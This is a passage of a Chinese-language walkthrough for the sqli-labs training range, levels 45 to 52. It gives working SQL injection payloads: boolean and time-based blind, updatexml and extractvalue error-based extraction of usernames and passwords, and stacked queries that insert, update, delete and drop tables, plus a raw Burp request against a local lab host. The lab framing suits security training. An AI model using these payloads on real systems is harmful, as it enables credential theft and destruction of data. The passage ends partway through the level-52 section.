### Less-45：POST · 密码点 · 闭合 `')` · 盲注倾向 + 堆叠

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-45/` |
| 注入方式 | POST（登录框） |
| 注入点 | **密码**（用户名常被转义） |
| 类型 | 字符型 |
| 闭合方式 | `')` |
| 回显特点 | 常无详细 SQL 报错；用登录成败做布尔判断，或堆叠写库验证 |
| 典型 SQL 形态 | `... username=('$username') and password=('$password')` |
| 与前后关 | 相对 44：闭合同类但改为 `')`；相对 43：闭合同为 `')`，但弱报错 |

#### 源码逻辑（理解用）

密码未充分过滤，落在带括号的引号中；`mysqli_multi_query` 仍可能可用。无报错时，`updatexml` 不一定能在页面上看到 XPATH 错误，优先布尔/堆叠。

#### 解题步骤

**1）确认闭合**

密码试：

```latex
1'
1')
1')#
1') or 1=1#
1') and 1=2#
```

* `1') or 1=1#` 登录成功、`1') and 1=2#` 失败 → 闭合为 `')`。

![1791089280807-1034b474-019e-4e37-9835-9ab3ead79aec.png](./img/285943702/1791089280807-1034b474-019e-4e37-9835-9ab3ead79aec-125752.png)

![1791089305544-0bfd1422-dbdf-45b7-9547-9a6407af4bbd.png](./img/285943702/1791089305544-0bfd1422-dbdf-45b7-9547-9a6407af4bbd-575125.png)

**2）布尔盲注**

```latex
1') or 1=1 and length(database())=8#
1') or 1=1 and substr(database(),1,1)='s'#
1') or 1=1 and ascii(substr(database(),1,1))=115#
```

![1791089563723-702eacc6-0079-4fd3-9730-50f73fd2d295.png](./img/285943702/1791089563723-702eacc6-0079-4fd3-9730-50f73fd2d295-862353.png)

![1791089605849-6ac6c3a2-1852-4a55-8481-dd810912ab58.png](./img/285943702/1791089605849-6ac6c3a2-1852-4a55-8481-dd810912ab58-133064.png)

![1791089648668-beb42d3e-f00e-4fc4-83d8-35dec880d888.png](./img/285943702/1791089648668-beb42d3e-f00e-4fc4-83d8-35dec880d888-337703.png)

**3）时间盲注备选**

```latex
1') or 1=1 and if(length(database())=8,sleep(5),0)#
1') or 1=1 and if(substr(database(),1,1)='s',sleep(5),0)#
```

![1791093186477-1f9cc960-fcd1-4242-9ca3-efbd42316e0d.png](./img/285943702/1791093186477-1f9cc960-fcd1-4242-9ca3-efbd42316e0d-973842.png)

**4）堆叠写操作（推荐验证方式）**

```latex
1'); insert into users(id,username,password) values(45,'less45','less45')#
```

```latex
1'); update users set password='p45' where username='admin'#
```

```latex
1'); delete from users where username='less45'#
```

用 `less45`/`less45` 登录或查库确认。

![1791093312509-9b0104ba-0aa3-421d-9802-0d3aa56f7f5d.png](./img/285943702/1791093312509-9b0104ba-0aa3-421d-9802-0d3aa56f7f5d-506917.png)

![1791093361119-1ae81633-d6cc-46a5-81a9-f379a8c55155.png](./img/285943702/1791093361119-1ae81633-d6cc-46a5-81a9-f379a8c55155-520806.png)

![1791093457040-22dc9f31-5695-409a-82d2-38133db523e3.png](./img/285943702/1791093457040-22dc9f31-5695-409a-82d2-38133db523e3-539503.png)

**5）Burp 示例**

```http
POST http://192.168.3.3/sqli-labs/Less-45/login.php HTTP/1.1
Host: 192.168.3.3
Content-Length: 121
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: http://192.168.3.3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.3.3/sqli-labs/Less-45/
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=0kd5tefprpojvrv28cos2uvp56
Connection: close

login_user=admin&login_password=1'); insert into users(id,username,password) values(45,'less45','less45')#&mysubmit=Login
```

![1791093737490-72229268-e39c-4fb7-ae94-4b954bac3c30.png](./img/285943702/1791093737490-72229268-e39c-4fb7-ae94-4b954bac3c30-873364.png)

![1791093755828-e5d210de-975b-4945-98d0-80e059418acc.png](./img/285943702/1791093755828-e5d210de-975b-4945-98d0-80e059418acc-917837.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `')` |
| 读 | 布尔/时间盲注 |
| 写 | `');` 堆叠 |
| 对照 | 44 为 `'` 盲注；43 为 `')` 报错 |

***

### Less-46：GET · ORDER BY 子句注入 · 数字型 · 报错

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-46/?sort=1` |
| 注入方式 | GET |
| 注入参数 | `sort`（不是 `id`） |
| 类型 | **数字型 ORDER BY 注入** |
| 典型 SQL 形态 | `SELECT * FROM users ORDER BY $sort` |
| 限制 | `ORDER BY` 后**不能**直接 `UNION SELECT`（语法位置不对） |
| 主攻手法 | 报错注入（`updatexml` / `extractvalue` / `rand`+`floor`）；或时间/布尔 |

#### 源码逻辑（理解用）

```latex
$sql = "SELECT * FROM users ORDER BY $sort";
```

* `ORDER BY 1` / `2` / `3`：按结果集第 1/2/3 **列**排序（数字有特殊含义）。
* `ORDER BY '2'`：按常量字符串排序，与「第 2 列」不是一回事（字符型关会遇到）。
* 注入点在 `ORDER BY` 之后，联合查询不适用，改用表达式报错或条件延时。

#### 解题步骤

**1）确认注入点**

```latex
?sort=1
?sort=2
?sort=3
?sort=1 asc
?sort=1 desc
```

排序结果变化 → `sort` 进入 `ORDER BY`。

![1791094430930-dc1b9562-0402-4b0f-aa76-f683e827fca3.png](./img/285943702/1791094430930-dc1b9562-0402-4b0f-aa76-f683e827fca3-734512.png)

![1791094443083-db02c6bb-d85f-4a89-8006-32076cbc69f6.png](./img/285943702/1791094443083-db02c6bb-d85f-4a89-8006-32076cbc69f6-921596.png)

![1791094453373-0193fc92-343c-4791-bdd0-42e1fa6e1b66.png](./img/285943702/1791094453373-0193fc92-343c-4791-bdd0-42e1fa6e1b66-233425.png)

![1791094474799-1fc79c17-1d2e-4c84-b434-5fa2c86fc29e.png](./img/285943702/1791094474799-1fc79c17-1d2e-4c84-b434-5fa2c86fc29e-396175.png)

![1791094502169-8388c0e6-11b9-47c8-947f-834ec8f3be1a.png](./img/285943702/1791094502169-8388c0e6-11b9-47c8-947f-834ec8f3be1a-503107.png)

```latex
?sort=4
```

列不存在时可能报错或异常。

![1791094591862-b1393590-b6cf-4df1-8b09-8e1c96b69e12.png](./img/285943702/1791094591862-b1393590-b6cf-4df1-8b09-8e1c96b69e12-456367.png)

**2）确认数字型**

无需引号闭合；`?sort=1 and 1=1` 类语句可参与表达式（具体以报错/排序是否异常为准）。

![1791094653898-d84ddf40-8fd2-42a5-aedd-d147cd010c56.png](./img/285943702/1791094653898-d84ddf40-8fd2-42a5-aedd-d147cd010c56-039642.png)

**3）报错注入（推荐）**

```latex
?sort=updatexml(1,concat(0x7e,database(),0x7e),1)
```

或：

```latex
?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)
```

```latex
?sort=extractvalue(1,concat(0x7e,database(),0x7e))
```

![1791094769500-261a78b0-dfe5-4311-a123-eaa52b395703.png](./img/285943702/1791094769500-261a78b0-dfe5-4311-a123-eaa52b395703-811708.png)

![1791094815059-217d3fc8-d8a6-41c4-b52d-1caca4b4cf97.png](./img/285943702/1791094815059-217d3fc8-d8a6-41c4-b52d-1caca4b4cf97-084442.png)

![1791094966846-cffa9a52-ccb5-40f8-836c-2c207291c34c.png](./img/285943702/1791094966846-cffa9a52-ccb5-40f8-836c-2c207291c34c-883634.png)

**4）取表、列、数据**

```latex
?sort=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)
```

```latex
?sort=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)
```

```latex
?sort=updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)
```

![1791095049168-2e88a500-d985-4556-92a8-50b8762d6fb9.png](./img/285943702/1791095049168-2e88a500-d985-4556-92a8-50b8762d6fb9-136594.png)

![1791095089333-a26d3868-6989-4edf-9551-20859d38d726.png](./img/285943702/1791095089333-a26d3868-6989-4edf-9551-20859d38d726-331462.png)

![1791095115873-a6f8540f-32a0-4fc2-959d-425ff3c679d0.png](./img/285943702/1791095115873-a6f8540f-32a0-4fc2-959d-425ff3c679d0-784425.png)

`updatexml`/`extractvalue` 回显长度有限，可 `limit` 逐条：

```latex
?sort=updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)
?sort=updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 1,1),0x7e),1)
```

![1791095253436-45785e47-2bc4-4ecb-9554-1500195ff8b5.png](./img/285943702/1791095253436-45785e47-2bc4-4ecb-9554-1500195ff8b5-691128.png)

![1791095265665-7d6c71bc-3864-46b9-bbcf-fb9e6736890c.png](./img/285943702/1791095265665-7d6c71bc-3864-46b9-bbcf-fb9e6736890c-286306.png)

**5）其它报错形式（可选）**

```latex
?sort=(select 1 from (select count(*),concat_ws(0x3a,(select database()),floor(rand()*2)) x from information_schema.tables group by x) a)
```

![1791095366087-9bed2ccf-429d-4891-aa28-79adc84a3bd9.png](./img/285943702/1791095366087-9bed2ccf-429d-4891-aa28-79adc84a3bd9-787481.png)

**6）时间盲注备选**

```latex
?sort=if(ascii(substr(database(),1,1))=115,sleep(5),1)
?sort=1 and if(length(database())=8,sleep(5),0)
```

![1791095852574-49456349-4c6f-4497-b209-a2f830fbd890.png](./img/285943702/1791095852574-49456349-4c6f-4497-b209-a2f830fbd890-506716.png)

**7）为何不能 UNION**

`ORDER BY` 子句位置不能接 `UNION SELECT ...`。应把 payload 写成**可出现在 ORDER BY 中的表达式**（函数调用、标量子查询等）。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 参数 | `sort`，落在 `ORDER BY` 后 |
| 类型 | 数字型，无引号 |
| 禁用 | 常规 `UNION` |
| 主用 | `updatexml` / `extractvalue` 报错；其次时间盲注 |
| 排序数字 | `ORDER BY 1` 表示第 1 列，不是字符串 `'1'` |

***

### Less-47：GET · ORDER BY 注入 · 字符型 · 报错

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-47/?sort=1` |
| 注入方式 | GET |
| 注入参数 | `sort` |
| 类型 | **字符型 ORDER BY 注入**（参数被引号包裹） |
| 典型 SQL 形态 | `SELECT * FROM users ORDER BY '$sort'` |
| 回显 | 有报错信息 |
| 与 Less-46 差异 | 46 为数字型 `ORDER BY $sort`；47 为 `ORDER BY '$sort'`，需闭合引号 |
| 主攻手法 | 闭合后使用 `updatexml` / `extractvalue` 等报错注入 |

#### 源码逻辑（理解用）

```latex
$sql = "SELECT * FROM users ORDER BY '$sort'";
```

* `ORDER BY '1'`、`ORDER BY '2'`：按**字符串常量**排序，不是「按第 N 列」排序，因此页面排序效果可能与 46 关不同。
* 注入时需先用 `'` 闭合，再插入表达式，最后注释尾巴。

#### 解题步骤

**1）确认参数与字符型**

```latex
?sort=1
?sort=1'
?sort=1'--+
```

`1'` 出现语法错误、`1'--+` 恢复 → 单引号字符型。

![1791096437150-7c6488fe-e1eb-4931-a5ee-173b466dab79.png](./img/285943702/1791096437150-7c6488fe-e1eb-4931-a5ee-173b466dab79-282943.png)

![1791096451688-7739c972-2a65-4a5e-a647-65e1a543e767.png](./img/285943702/1791096451688-7739c972-2a65-4a5e-a647-65e1a543e767-402233.png)

**2）确认在 ORDER BY 位置**

```latex
?sort=1' and '1'='1
```

行为符合拼接进 `ORDER BY '...'` 的预期即可；不要按 WHERE 型去强行 `UNION`。

![1791096498619-cb23edab-794b-42bb-810f-3273e2765bd8.png](./img/285943702/1791096498619-cb23edab-794b-42bb-810f-3273e2765bd8-292255.png)

**3）报错注入**

```latex
?sort=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

或：

```latex
?sort=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+
```

![1791096648823-a379d818-ca90-473e-b6e9-9ec43e94db35.png](./img/285943702/1791096648823-a379d818-ca90-473e-b6e9-9ec43e94db35-217471.png)

**4）取表、列、数据**

```latex
?sort=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+
```

```latex
?sort=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)--+
```

```latex
?sort=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+
```

![1791096867938-b3038c3a-e7ba-41c4-86d4-db20e9c0843a.png](./img/285943702/1791096867938-b3038c3a-e7ba-41c4-86d4-db20e9c0843a-818509.png)

![1791096909243-56881890-9e10-41cd-84ca-79b41c996523.png](./img/285943702/1791096909243-56881890-9e10-41cd-84ca-79b41c996523-358046.png)

![1791096980689-06b35e21-390b-477a-9ffd-1d8e3d996fee.png](./img/285943702/1791096980689-06b35e21-390b-477a-9ffd-1d8e3d996fee-095396.png)

回显过长时用 `limit` 分段：

```latex
?sort=1' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)--+
```

![1791097031290-8ceba170-30dc-4b03-b2a1-4efbbe8c637d.png](./img/285943702/1791097031290-8ceba170-30dc-4b03-b2a1-4efbbe8c637d-644760.png)

**5）其它写法（可选）**

把整个排序表达式换成标量子查询（仍需注意引号闭合与注释）：

```latex
?sort=1' and (select 1 from (select count(*),concat_ws(0x3a,database(),floor(rand()*2)) x from information_schema.tables group by x) a)--+
```

![1791097281607-51bb687d-1ae9-4395-a8a2-e3bd12a19fca.png](./img/285943702/1791097281607-51bb687d-1ae9-4395-a8a2-e3bd12a19fca-857741.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | 单引号 `'` |
| 位置 | `ORDER BY` 后，不宜 `UNION` |
| 主用 | 报错函数 |
| 与 46 | 多一层引号；排序数字语义变为字符串常量 |

***

### Less-48：GET · ORDER BY 注入 · 数字型 · 盲注（无报错）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-48/?sort=1` |
| 注入方式 | GET |
| 注入参数 | `sort` |
| 类型 | **数字型 ORDER BY 注入** |
| 典型 SQL 形态 | `SELECT * FROM users ORDER BY $sort` |
| 回显 | **无详细 SQL 报错** |
| 与 Less-46 差异 | SQL 位置同类（数字型 ORDER BY），但关闭报错，改用时间/布尔盲注 |
| 主攻手法 | `if` + `sleep` / `benchmark`；或根据排序结果差异做布尔判断 |

#### 源码逻辑（理解用）

与 46 类似，`$sort` 直接进入 `ORDER BY`，无引号。应用层不输出 `mysql_error`，`updatexml` 即使触发错误也可能看不到内容，因此以**延时**或**页面排序/内容是否变化**为准。

#### 解题步骤

**1）确认注入点**

```latex
?sort=1
?sort=2
?sort=1 asc
?sort=1 desc
```

排序变化说明参数生效。

![1791114036423-f4cb7181-4b93-4f13-8a19-bb37485bb43a.png](./img/285943702/1791114036423-f4cb7181-4b93-4f13-8a19-bb37485bb43a-234098.png)

![1791114048435-3c8b04cf-d899-47be-bda5-5e00c624e388.png](./img/285943702/1791114048435-3c8b04cf-d899-47be-bda5-5e00c624e388-242330.png)

**2）确认无报错**

```latex
?sort=updatexml(1,concat(0x7e,database()),1)
```

若页面无 XPATH 类错误信息，按盲注处理。

![1791114433425-02cf7803-4923-450f-9a46-54ec8a5b3e56.png](./img/285943702/1791114433425-02cf7803-4923-450f-9a46-54ec8a5b3e56-385658.png)

**3）时间盲注（推荐）**

```latex
?sort=if(length(database())=8,sleep(5),1)
```

```latex
?sort=if(ascii(substr(database(),1,1))=115,sleep(5),0)
```

```latex
?sort=1 and if(substr(database(),1,1)='s',sleep(5),0)
```

库名、表名、字段逐字符枚举即可。

![1791115059054-af6068c3-9ab6-476d-bf56-408e434652a2.png](./img/285943702/1791115059054-af6068c3-9ab6-476d-bf56-408e434652a2-876176.png)

**4）取表示例（时间）**

```latex
?sort=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101,sleep(5),0)
```

![1791115597197-7507c67b-295c-4db6-acac-d5bb5ebf2d5f.png](./img/285943702/1791115597197-7507c67b-295c-4db6-acac-d5bb5ebf2d5f-291261.png)

**5）取数据示例**

```latex
?sort=if(ascii(substr((select group_concat(username,0x3a,password) from users),1,1))=68,sleep(5),0)
```

配合脚本按位置递增更高效。

![1791115710579-16b5bd6d-0fc7-44c1-8383-c9d56afe2f2e.png](./img/285943702/1791115710579-16b5bd6d-0fc7-44c1-8383-c9d56afe2f2e-566419.png)

**6）布尔思路（可选）**

利用 `ORDER BY` 表达式真假导致排序不同，对比两页 HTML 差异（不如时间直观，可作补充）：

```latex
?sort=if(length(database())=8,id,username)
?sort=if(length(database())=9,id,username)
```

若 `=8` 与 `=9` 时行顺序不同，可作真假依据。

![1791116978834-30e9bdf7-3e09-48f2-8577-3d5531cd9397.png](./img/285943702/1791116978834-30e9bdf7-3e09-48f2-8577-3d5531cd9397-134838.png)

![1791116989453-1c2956d0-cfaa-45bc-9fb3-eb66f8057aaa.png](./img/285943702/1791116989453-1c2956d0-cfaa-45bc-9fb3-eb66f8057aaa-250142.png)

**7）benchmark 备选**

```latex
?sort=if(ascii(substr(database(),1,1))=115,benchmark(5000000,md5(1)),0)
```

在 `sleep` 被限制时使用。

![1791117083694-c205eb6b-35d7-40e1-bc5a-01ff84b01f73.png](./img/285943702/1791117083694-c205eb6b-35d7-40e1-bc5a-01ff84b01f73-232693.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 类型 | 数字型 `ORDER BY` |
| 读数据 | 时间盲注为主 |
| 与 46 | 同位置；46 可报错，48 靠延时/布尔 |
| 与 47 | 47 有引号+报错；48 无引号+盲注 |

***

### Less-49：GET · ORDER BY 注入 · 字符型 · 盲注（无报错）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-49/?sort=1` |
| 注入方式 | GET |
| 注入参数 | `sort` |
| 类型 | **字符型 ORDER BY 注入** |
| 典型 SQL 形态 | `SELECT * FROM users ORDER BY '$sort'` |
| 回显 | **无详细 SQL 报错** |
| 与 Less-47 差异 | 同为带引号的 ORDER BY；47 可报错，49 只能盲注 |
| 与 Less-48 差异 | 48 为数字型盲注；49 需先闭合 `'` |
| 主攻手法 | 时间盲注（`if` + `sleep`）；注意 ORDER BY 下 sleep 可能被多行重复执行 |

#### 源码逻辑（理解用）

```latex
$sql = "SELECT * FROM users ORDER BY '$sort'";
```

无 `mysql_error` 输出时，`updatexml` 即使出错也看不到内容。排序表达式会对结果集处理，`sleep` 可能按行数叠加，导致页面极慢或 500，构造时要控制延时条件。

#### 解题步骤

**1）确认字符型**

```latex
?sort=1
?sort=1'
?sort=1'--+
```

`1'` 异常、`1'--+` 恢复 → 单引号闭合。

![1791117551608-6da7148b-2cb9-4b5f-8aff-17b35582c7a6.png](./img/285943702/1791117551608-6da7148b-2cb9-4b5f-8aff-17b35582c7a6-439719.png)

![1791117564024-922ac72f-e4e7-462e-be1b-3961bd7b5a49.png](./img/285943702/1791117564024-922ac72f-e4e7-462e-be1b-3961bd7b5a49-749729.png)

**2）确认无报错可读**

```latex
?sort=1' and updatexml(1,concat(0x7e,database()),1)--+
```

无 XPATH 类回显则改用盲注。

![1791117612033-7b871ded-f729-4f67-8548-2b1693e63e98.png](./img/285943702/1791117612033-7b871ded-f729-4f67-8548-2b1693e63e98-704952.png)

**3）时间盲注**

```latex
?sort=1' and if(length(database())=8,sleep(2),0)--+
```

```latex
?sort=1' and if(ascii(substr(database(),1,1))=115,sleep(2),0)--+
```

说明：

* `sleep` 秒数不宜过大，避免多行累计超时。
* 也可写成 `ORDER BY` 可接受的表达式形式，例如：

```latex
?sort=1' and if(length(database())=8,sleep(2),1) and '1'='1
```

![1791117732393-67aec794-024a-4273-99e5-e5889852fe2c.png](./img/285943702/1791117732393-67aec794-024a-4273-99e5-e5889852fe2c-746673.png)

![1791117897933-113babb6-3532-41fb-ab99-5eec9f52d78b.png](./img/285943702/1791117897933-113babb6-3532-41fb-ab99-5eec9f52d78b-135874.png)

**4）枚举表与数据**

```latex
?sort=1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101,sleep(2),0)--+
```

```latex
?sort=1' and if(ascii(substr((select group_concat(username,0x3a,password) from users),1,1))=68,sleep(2),0)--+
```

配合脚本按位置递增更高效。

![1791118265590-4b737bf2-5a48-4d50-b05d-6b586a701cd5.png](./img/285943702/1791118265590-4b737bf2-5a48-4d50-b05d-6b586a701cd5-856336.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `'` + 注释 |
| 读数据 | 时间盲注为主 |
| 注意 | ORDER BY 下 sleep 可能×行数，控制延时 |
| 对照 | 47 报错字符型；48 盲注数字型；49 盲注字符型 |

***

### Less-50：GET · ORDER BY 注入 · 数字型 · 堆叠

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-50/?sort=1` |
| 注入方式 | GET |
| 注入参数 | `sort` |
| 类型 | **数字型 ORDER BY** + **堆叠注入** |
| 关键 API | `mysqli_multi_query()` |
| 典型 SQL 形态 | `SELECT * FROM users ORDER BY $sort` |
| 与 Less-46 差异 | 46 单语句；50 可多语句（`;` 后追加 SQL） |
| 主攻手法 | 堆叠写库验证；也可用报错/时间（同 46/48） |

#### 源码逻辑（理解用）

```latex
$sql = "SELECT * FROM users ORDER BY $sort";
mysqli_multi_query($con, $sql);
```

数字型无需引号，可直接：

```sql
ORDER BY 1; insert into users ...
```

页面通常只展示第一条 SELECT 的结果集，后面语句是否执行看**数据是否变化**。

#### 解题步骤

**1）确认数字型 ORDER BY**

```latex
?sort=1
?sort=2
?sort=1 desc
```

排序变化 → 参数在 `ORDER BY` 中。

![1791122321592-5fe431c6-7c49-49cb-a109-5188c112edc8.png](./img/285943702/1791122321592-5fe431c6-7c49-49cb-a109-5188c112edc8-170207.png)

![1791122333494-363e7933-3731-43f8-8d2c-3ff4d77cce27.png](./img/285943702/1791122333494-363e7933-3731-43f8-8d2c-3ff4d77cce27-049829.png)

![1791122350722-f07cbabd-5b03-4f35-bb91-0d4ab33dec9a.png](./img/285943702/1791122350722-f07cbabd-5b03-4f35-bb91-0d4ab33dec9a-442563.png)

**2）堆叠插入（推荐验证）**

```latex
?sort=1; insert into users(id,username,password) values(50,'less50','less50')--+
```

验证：

```latex
?sort=1 desc
```

若按 id 降序能看到较大 id 的新用户，或直接查库确认 `less50` 存在。

![1791122528260-1aa39f84-9368-4ad4-be9b-498453c1fd57.png](./img/285943702/1791122528260-1aa39f84-9368-4ad4-be9b-498453c1fd57-563079.png)

![1791122549590-b254f601-898e-4062-9617-3cca5b938ed8.png](./img/285943702/1791122549590-b254f601-898e-4062-9617-3cca5b938ed8-235456.png)

**3）建表 / 拷贝**

```latex
?sort=1; create table less50_copy like users--+
?sort=1; insert into less50_copy select * from users--+
```

![1791122608516-93014fc3-0a03-456a-939f-8b1d88ffc4cb.png](./img/285943702/1791122608516-93014fc3-0a03-456a-939f-8b1d88ffc4cb-588469.png)

![1791122624915-a6417502-a95e-4b07-a3d5-38dc7e6d4991.png](./img/285943702/1791122624915-a6417502-a95e-4b07-a3d5-38dc7e6d4991-615453.png)

**4）报错读数（若开启报错）**

与 46 相同，例如：

```latex
?sort=updatexml(1,concat(0x7e,database(),0x7e),1)

?sort=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)

?sort=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)

?sort=updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)
```

![1791122667156-778c8b6b-7c9c-45d6-945d-6bd05b9b111e.png](./img/285943702/1791122667156-778c8b6b-7c9c-45d6-945d-6bd05b9b111e-194763.png)

![1791122891102-d61acf12-f0e5-42a8-b593-4e6d35f9f63b.png](./img/285943702/1791122891102-d61acf12-f0e5-42a8-b593-4e6d35f9f63b-010714.png)

**5）时间盲注备选**

```latex
?sort=if(length(database())=8,sleep(3),1)
```

有堆叠时更推荐写库验证，不必依赖延时。

![1791123057303-d75fef41-bb94-4d5b-8936-64c37d8f936d.png](./img/285943702/1791123057303-d75fef41-bb94-4d5b-8936-64c37d8f936d-236062.png)

**6）其它堆叠（仅限靶场）**

```latex
?sort=1; update users set password='p50' where username='less50'--+
?sort=1; delete from users where username='less50'--+
?sort=1; drop table if exists less50_copy--+
```

练习后可用首页 **Setup/resetDB** 恢复。

![1791123107845-52a27a8c-1b38-447f-b43e-40e2720d8d4c.png](./img/285943702/1791123107845-52a27a8c-1b38-447f-b43e-40e2720d8d4c-145811.png)

![1791123138955-a983a766-7654-4e42-957e-49375db0ec00.png](./img/285943702/1791123138955-a983a766-7654-4e42-957e-49375db0ec00-630815.png)

![1791123177910-aff8bbca-41d8-40e6-bb98-06fc18c177f6.png](./img/285943702/1791123177910-aff8bbca-41d8-40e6-bb98-06fc18c177f6-625073.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 形态 | `?sort=1; 第二条SQL--+` |
| 类型 | 数字型，无引号 |
| 验证 | INSERT 后看排序结果或库表 |
| 与 46 | 同 ORDER BY 数字型，本关多堆叠 |
| 与 38～41 | 堆叠思想相同，注入点在 `ORDER BY` |

***

### Less-51：GET · ORDER BY 注入 · 字符型 · 堆叠

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-51/?sort=1` |
| 注入方式 | GET |
| 注入参数 | `sort` |
| 类型 | **字符型 ORDER BY** + **堆叠注入** |
| 闭合 | 单引号 `'` |
| 关键 API | `mysqli_multi_query()` |
| 典型 SQL 形态 | `SELECT * FROM users ORDER BY '$sort'` |
| 与 Less-47/49 差异 | 同为带引号的 ORDER BY；本关支持 `;` 多语句 |
| 与 Less-50 差异 | 50 为数字型堆叠；51 需先 `'` 闭合再 `;` |

#### 源码逻辑（理解用）

```latex
$sql = "SELECT * FROM users ORDER BY '$sort'";
mysqli_multi_query($con, $sql);
```

注入形态类似：

```sql
ORDER BY '1'; insert into users ... -- '
```

页面多只展示第一条 SELECT 结果，堆叠是否成功以**写库副作用**为准。

#### 解题步骤

**1）确认字符型**

```latex
?sort=1
?sort=1'
?sort=1'--+
```

`1'` 异常、`1'--+` 正常 → 单引号闭合。

![1791168811603-222a26f9-83a5-4bc1-8eca-f16957696bbd.png](./img/285943702/1791168811603-222a26f9-83a5-4bc1-8eca-f16957696bbd-050816.png)

![1791168824899-4c8e219e-8ca7-47be-8a00-880b9abc6490.png](./img/285943702/1791168824899-4c8e219e-8ca7-47be-8a00-880b9abc6490-730604.png)

**2）堆叠插入**

```latex
?sort=1'; insert into users(id,username,password) values(51,'less51','less51')--+
```

验证：按 id 排序观察新行，或：

```latex
?sort=1 desc
```

查是否出现 `less51`。

![1791168905225-0ad20d4c-1d71-4fdb-b4e1-a7ad6b890016.png](./img/285943702/1791168905225-0ad20d4c-1d71-4fdb-b4e1-a7ad6b890016-582395.png)

![1791168928109-db3d3871-7e45-4818-81e6-78c250b14571.png](./img/285943702/1791168928109-db3d3871-7e45-4818-81e6-78c250b14571-531447.png)

**3）建表 / 拷贝数据**

```latex
?sort=1'; create table less51_copy like users--+
?sort=1'; insert into less51_copy select * from users--+
```

![1791168976390-76ec5b1f-e70d-4e1c-82f0-acfefeffd6e7.png](./img/285943702/1791168976390-76ec5b1f-e70d-4e1c-82f0-acfefeffd6e7-764715.png)

![1791169004824-b580febf-20cb-430f-a6ed-4cbaadb3db85.png](./img/285943702/1791169004824-b580febf-20cb-430f-a6ed-4cbaadb3db85-068587.png)

![1791169031779-54f3af0c-6e92-4e92-bea0-8c74386a021b.png](./img/285943702/1791169031779-54f3af0c-6e92-4e92-bea0-8c74386a021b-492766.png)

**4）报错读数（若有报错回显）**

```latex
?sort=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+

?sort=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+

?sort=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)--+

?sort=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+
```

无报错时改用时间盲注（同 49），或只练堆叠。

![1791169077169-1bfcb700-f6ff-41bd-971f-e7449213535c.png](./img/285943702/1791169077169-1bfcb700-f6ff-41bd-971f-e7449213535c-865855.png)

![1791169204377-9339476f-aaec-4b1b-893f-90202cac9e03.png](./img/285943702/1791169204377-9339476f-aaec-4b1b-893f-90202cac9e03-348907.png)

**5）其它堆叠（仅限靶场）**

```latex
?sort=1'; update users set password='p51' where username='less51'--+
?sort=1'; delete from users where username='less51'--+
?sort=1'; drop table if exists less51_copy--+
```

![1791169264075-68df40f7-7917-4feb-a076-7ceef25bf400.png](./img/285943702/1791169264075-68df40f7-7917-4feb-a076-7ceef25bf400-082171.png)

![1791169286424-940bf427-2fbd-4673-bcae-e95bd7ffec3a.png](./img/285943702/1791169286424-940bf427-2fbd-4673-bcae-e95bd7ffec3a-047006.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 形态 | `?sort=1'; 第二条SQL--+` |
| 闭合 | 必须先 `'` 再 `;` |
| 验证 | INSERT/建表，不单靠页面 SELECT |
| 对照 | 50 无引号；51 有引号 |

***

### Less-52：GET · ORDER BY 注入 · 数字型 · 盲注倾向 + 堆叠

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-52/?sort=1` |
| 注入方式 | GET |
| 注入参数 | `sort` |
| 类型 | **数字型 ORDER BY** + **堆叠** |
